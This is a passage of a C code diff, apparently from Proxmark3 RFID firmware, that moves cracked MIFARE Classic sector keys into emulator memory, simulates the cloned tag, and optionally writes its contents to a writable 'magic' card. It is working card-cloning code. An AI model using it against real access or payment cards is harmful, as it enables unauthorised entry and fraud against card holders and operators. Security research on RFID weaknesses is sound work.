+		If enabled, transfers found keys to memory and loads target content in emulator memory. Then it simulates to be the tag it has basically cloned.
+	*/
+	if ((transferToEml) && (!err)) {
+		emlClearMem();
+		uint8_t mblock[16];
+		for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
+			if (validKey[0][sectorNo] || validKey[1][sectorNo]) {
+				emlGetMem(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1); // data, block num, blocks count (max 4)
+					for (uint16_t t = 0; t < 2; t++) {
+						if (validKey[t][sectorNo]) {
+							memcpy(mblock + t*10, foundKey[t][sectorNo], 6);
+						}
+					}
+					emlSetMem(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1);
+				}
+			}
+		Dbprintf("\t✓ Found keys have been transferred to the emulator memory.");
+		if (ecfill) {
+			Dbprintf("\tFilling in with key A.");
+			// SpinDelay(500);
+			MifareECardLoad(sectorsCnt, 0, 0, &filled);
+			if (filled != 1) {
+				Dbprintf("\tRetrying with key B.");
+				MifareECardLoad(sectorsCnt, 1, 0, &filled);
+			}
+			if ((filled == 1) && simulation) {
+				Dbprintf("\t✓ Filled, simulation started.");
+				// This will tell the fpga to emulate using previous keys and current target tag content.
+				Dbprintf("\t Press button to abort simulation at anytime.");
+				LED_B_ON(); //green
+				Mifare1ksim(0, 0, 0, NULL);
+				LED_B_OFF();
+
+				/*
+					Needs further testing.
+				*/
+				if (fillFromEmulator) {
+					int flags = 0;
+					LED_A_ON(); //yellow
+					for (int blockNum = 0; blockNum < 16 * 4; blockNum += 1) {
+						emlGetMem(mblock, blockNum, 1);
+						// switch on field and send magic sequence
+						if (blockNum == 0) flags = 0x08 + 0x02;
+
+						// just write
+						if (blockNum == 1) flags = 0;
+
+						// Done. Magic Halt and switch off field.
+						if (blockNum == 16 * 4 - 1) flags = 0x04 + 0x10;
+
+						saMifareCSetBlock(0, flags & 0xFE, blockNum, mblock);
+					}
+
+					LED_B_ON(); //green
+				}
+			} else if (filled != 1) {
+				Dbprintf("\t✕ Memory could not be filled due to errors.");
+				LED_C_ON();
+			}
+		}
 	}
 }
